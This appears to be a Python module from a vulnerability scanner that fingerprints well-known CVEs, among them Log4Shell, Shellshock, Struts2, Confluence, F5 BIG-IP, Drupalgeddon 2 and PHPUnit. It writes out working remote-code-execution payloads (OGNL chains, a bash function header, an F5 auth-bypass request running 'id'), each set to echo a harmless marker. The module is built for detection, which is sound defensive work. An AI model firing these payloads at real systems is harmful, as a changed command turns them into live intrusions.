"""
Checks for well-known high-impact CVEs.

Each CVE here uses passive/semi-passive probing: send ONE request with a
distinctive payload, look for a confirmable fingerprint (banner, error,
behavior change). Avoids active exploitation; emits a finding only when
the fingerprint uniquely identifies the vulnerability.

Note: nuclei covers thousands of CVEs; this module is a floor for when
nuclei isn't installed and a double-check for the highest-impact ones.
"""
import re
import urllib.parse
from .base import BaseCheck
from ..models import Finding
from ..utils import run


class FamousCVEsCheck(BaseCheck):
    """Flagship-CVE fingerprinting."""

    name = "Famous CVEs"
    description = (
        "Fingerprint well-known high-impact CVEs (Log4Shell, Shellshock, "
        "Spring4Shell, Struts, Confluence, F5 BIG-IP, GitLab, ProxyShell, etc.)"
    )

    # ========================================================================
    # CVE-2021-44228 - Log4Shell (JNDI lookup in logged header)
    # ========================================================================
    LOG4SHELL_HEADERS = ["User-Agent", "Referer", "X-Api-Version", "X-Forwarded-For"]

    def _log4shell(self, base: str) -> None:
        """
        Log4Shell: injects ${jndi:ldap://127.0.0.1:1/x} and looks for the
        server crashing, hanging, or returning a 500 after the probe. True
        OOB confirmation needs interactsh (optional). We flag the suspicion
        at low severity when the probe uniquely changes response length.
        """
        rc_base, baseline, _ = run(
            ["curl", "-sI", "--max-time", "6", base],
            timeout=10,
        )
        if rc_base != 0 or not baseline:
            return
        baseline_len = len(baseline)
        for hdr in self.LOG4SHELL_HEADERS:
            payload = "${jndi:ldap://log4shell-probe.invalid:1389/a}"
            rc, body, _ = run(
                ["curl", "-sI", "--max-time", "6",
                 "-H", f"{hdr}: {payload}", base],
                timeout=10,
            )
            if rc != 0 or not body:
                continue
            # True exploitation requires OOB validation; here we only flag when:
            # 1. Response changes substantially vs baseline AND
            # 2. First status line is 5xx (server error from JNDI resolution failure)
            first = body.splitlines()[0] if body.splitlines() else ""
            code = self._status_code(first)
            if code >= 500 and abs(len(body) - baseline_len) > 50:
                self.findings.append(Finding(
                    severity="info",
                    title=f"Log4Shell suspicion via {hdr} header (CVE-2021-44228)",
                    host=base,
                    detail=(
                        f"JNDI payload in {hdr} caused server-side error ({code}). "
                        "Confirm with OOB (interactsh) before treating as exploitable."
                    ),
                    source="log4shell",
                    url=base,
                    tags=["cve-2021-44228", "log4shell", "needs-oob-confirmation"],
                    evidence=payload,
                ))
                return

    # ========================================================================
    # CVE-2014-6271 - Shellshock (bash function definition in header)
    # ========================================================================
    SHELLSHOCK_PATHS = ["/cgi-bin/test.cgi", "/cgi-bin/", "/", "/cgi-bin/status"]

    def _shellshock(self, base: str) -> None:
        marker = "shellshock7x7marker"
        payload = f"() {{ :;}}; echo; echo; /bin/echo {marker}"
        for path in self.SHELLSHOCK_PATHS:
            url = f"{base}{path}"
            rc, body, _ = run(
                ["curl", "-sL", "--max-time", "6",
                 "-H", f"User-Agent: {payload}",
                 "-H", f"Cookie: {payload}", url],
                timeout=10,
            )
            if rc != 0 or not body:
                continue
            if marker in body:
                self.findings.append(Finding(
                    severity="critical",
                    title="Shellshock - Remote Code Execution (CVE-2014-6271)",
                    host=base,
                    detail=f"Bash function-definition payload executed on {url}; marker reflected",
                    source="shellshock",
                    url=url,
                    tags=["cve-2014-6271", "shellshock", "rce"],
                    evidence=marker,
                ))
                return

    # ========================================================================
    # CVE-2017-5638 - Apache Struts2 OGNL injection
    # ========================================================================
    STRUTS_PAYLOAD = (
        "%{(#_='multipart/form-data')."
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        "(#cmd='struts7x7marker')."
        "(#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter())."
        "(#out.println(#cmd))."
        "(#out.close())}"
    )

    def _struts(self, base: str) -> None:
        marker = "struts7x7marker"
        rc, body, _ = run(
            ["curl", "-sL", "--max-time", "6",
             "-H", f"Content-Type: {self.STRUTS_PAYLOAD}", base],
            timeout=10,
        )
        if rc == 0 and body and marker in body:
            self.findings.append(Finding(
                severity="critical",
                title="Apache Struts2 OGNL Injection (CVE-2017-5638)",
                host=base,
                detail="Content-Type OGNL payload executed and reflected marker.",
                source="struts2",
                url=base,
                tags=["cve-2017-5638", "struts", "rce"],
                evidence=marker,
            ))

    # ========================================================================
    # CVE-2022-22965 - Spring4Shell
    # ========================================================================
    def _spring4shell(self, base: str) -> None:
        probe = (
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
            "spring4shell7x7marker"
        )
        rc, body, _ = run(
            ["curl", "-sL", "--max-time", "6",
             "-X", "POST", "-d", probe, base],
            timeout=10,
        )
        if rc != 0 or not body:
            return
        # Many Spring apps return 400 for this payload; a 500 or
        # 'IllegalStateException' signals a reachable PropertyDescriptor
        body_lower = body.lower()
        if any(sig in body_lower for sig in [
            "beanutils", "beanpropertyhandler", "spring4shell",
            "unknown property 'class.module.classloader"
        ]):
            self.findings.append(Finding(
                severity="critical",
                title="Spring4Shell suspicion (CVE-2022-22965)",
                host=base,
                detail="Spring binding error indicates PropertyDescriptor reachability.",
                source="spring4shell",
                url=base,
                tags=["cve-2022-22965", "spring4shell", "rce"],
                evidence=body[:300],
            ))

    # ========================================================================
    # CVE-2022-26134 - Atlassian Confluence OGNL
    # ========================================================================
    def _confluence(self, base: str) -> None:
        marker = "confluence7x7"
        path = f"/%24%7B(%23a%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%22echo%20{marker}%22).getInputStream())).(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader(%22X-Cmd%22%2C%23a))%7D/"
        rc, headers, _ = run(
            ["curl", "-sI", "--max-time", "6", f"{base}{path}"],
            timeout=10,
        )
        if rc == 0 and headers and marker in headers.lower():
            self.findings.append(Finding(
                severity="critical",
                title="Atlassian Confluence OGNL Injection (CVE-2022-26134)",
                host=base,
                detail="OGNL command executed and reflected in response header",
                source="confluence",
                url=base + path,
                tags=["cve-2022-26134", "confluence", "rce"],
                evidence=marker,
            ))

    # ========================================================================
    # CVE-2022-1388 - F5 BIG-IP iControl REST auth bypass
    # ========================================================================
    def _f5_bigip(self, base: str) -> None:
        url = f"{base}/mgmt/tm/util/bash"
        rc, body, _ = run(
            ["curl", "-sk", "--max-time", "6",
             "-X", "POST", "-u", "admin:",
             "-H", "Content-Type: application/json",
             "-H", "Connection: X-F5-Auth-Token, keep-alive",
             "-H", "X-F5-Auth-Token: a",
             "-d", '{"command":"run","utilCmdArgs":"-c id"}',
             url],
            timeout=10,
        )
        if rc == 0 and body:
            body_lower = body.lower()
            if '"commandresult":"uid=' in body_lower:
                self.findings.append(Finding(
                    severity="critical",
                    title="F5 BIG-IP iControl REST Auth Bypass RCE (CVE-2022-1388)",
                    host=base,
                    detail="Unauthenticated bash command executed via iControl REST API",
                    source="f5_bigip",
                    url=url,
                    tags=["cve-2022-1388", "f5", "rce"],
                    evidence=body[:300],
                ))

    # ========================================================================
    # Exchange ProxyShell / ProxyLogon (CVE-2021-26855, CVE-2021-34473)
    # ========================================================================
    def _exchange(self, base: str) -> None:
        indicators = [
            "/owa/auth/logon.aspx",
            "/autodiscover/autodiscover.xml",
            "/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application",
        ]
        for path in indicators:
            rc, headers, _ = run(
                ["curl", "-sI", "--max-time", "6", f"{base}{path}"],
                timeout=10,
            )
            if rc != 0 or not headers:
                continue
            headers_lower = headers.lower()
            if "x-aspnet-version" in headers_lower or "x-owa-version" in headers_lower:
                # Exchange detected - flag awareness; nuclei does full exploitation
                self.findings.append(Finding(
                    severity="info",
                    title="Microsoft Exchange Server detected (check ProxyShell/ProxyLogon)",
                    host=base,
                    detail=(
                        "Exchange server exposed. Vulnerable to a family of RCE/SSRF CVEs "
                        "including ProxyShell (CVE-2021-34473) and ProxyLogon (CVE-2021-26855). "
                        "Run nuclei with -t cves/2021/CVE-2021-* for full probing."
                    ),
                    source="exchange",
                    url=f"{base}{path}",
                    tags=["exchange", "cve-2021-34473", "cve-2021-26855", "proxyshell"],
                ))
                return

    # ========================================================================
    # CVE-2021-22205 - GitLab RCE via image upload
    # ========================================================================
    def _gitlab(self, base: str) -> None:
        rc, body, _ = run(
            ["curl", "-sL", "--max-time", "6",
             f"{base}/users/sign_in"],
            timeout=10,
        )
        if rc != 0 or not body:
            return
        if "gitlab" in body.lower() and "sign in" in body.lower():
            self.findings.append(Finding(
                severity="info",
                title="GitLab instance detected (check CVE-2021-22205)",
                host=base,
                detail=(
                    "GitLab login page found. CVE-2021-22205 (unauth RCE via ExifTool) "
                    "and others affect older versions. Verify version against GitLab security advisories."
                ),
                source="gitlab",
                url=f"{base}/users/sign_in",
                tags=["gitlab", "cve-2021-22205"],
            ))

    # ========================================================================
    # CVE-2022-30190 - Follina (ms-msdt)
    # ========================================================================
    def _follina(self, base: str) -> None:
        # Follina is primarily a client-side bug; detect links hosting .docx/.html
        # with ms-msdt URI in exposed storage
        rc, body, _ = run(
            ["curl", "-sL", "--max-time", "6", base],
            timeout=10,
        )
        if rc == 0 and body and "ms-msdt:" in body.lower():
            self.findings.append(Finding(
                severity="high",
                title="Follina ms-msdt URI reference (CVE-2022-30190)",
                host=base,
                detail="Page contains ms-msdt: URI which may be used for Follina exploitation",
                source="follina",
                url=base,
                tags=["cve-2022-30190", "follina"],
            ))

    # ========================================================================
    # CVE-2018-7600 - Drupalgeddon 2
    # ========================================================================
    def _drupalgeddon(self, base: str) -> None:
        marker = "drupalgeddon7x7"
        url = f"{base}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        rc, body, _ = run(
            ["curl", "-sL", "--max-time", "6",
             "-X", "POST",
             "-d", f"form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]={marker}",
             url],
            timeout=10,
        )
        if rc == 0 and body and marker in body:
            self.findings.append(Finding(
                severity="critical",
                title="Drupalgeddon 2 - Drupal RCE (CVE-2018-7600)",
                host=base,
                detail="Drupal form render pipeline executed attacker-provided renderable",
                source="drupalgeddon",
                url=url,
                tags=["cve-2018-7600", "drupal", "rce"],
                evidence=marker,
            ))

    # ========================================================================
    # CVE-2017-9841 - PHPUnit eval-stdin.php
    # ========================================================================
    def _phpunit_eval_stdin(self, base: str) -> None:
        paths = [
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/vendor/phpunit/src/Util/PHP/eval-stdin.php",
            "/phpunit/src/Util/PHP/eval-stdin.php",
            "/vendor/phpunit/Util/PHP/eval-stdin.php",
        ]
        marker = "phpunit7x7"
        payload = f"<?php echo '{marker}'; ?>"
        for path in paths:
            url = f"{base}{path}"
            rc, body, _ = run(
                ["curl", "-sL", "--max-time", "6",
                 "-X", "POST", "-d", payload, url],
                timeout=10,
            )
            if rc == 0 and body and marker in body:
                self.findings.append(Finding(
                    severity="critical",
                    title="PHPUnit eval-stdin.php RCE (CVE-2017-9841)",
                    host=base,
                    detail=f"Reachable eval-stdin.php executes POST body as PHP: {url}",
                    source="phpunit",
                    url=url,
                    tags=["cve-2017-9841", "phpunit", "rce"],
                    evidence=marker,
                ))
                return

    # ========================================================================
    # Heartbleed is covered by SSLCheck/testssl.sh (TLS layer); skipped here.
    # ========================================================================

    def execute(self) -> list[Finding]:
        probes = [
            self._log4shell,
            self._shellshock,
            self._struts,
            self._spring4shell,
            self._confluence,
            self._f5_bigip,
            self._exchange,
            self._gitlab,
            self._follina,
            self._drupalgeddon,
            self._phpunit_eval_stdin,
        ]
        for base in self._hosts(3):
            for probe in probes:
                try:
                    probe(base)
                except Exception as exc:
                    self.log.debug(f"  {probe.__name__}({base}): {exc}")
        return self.findings
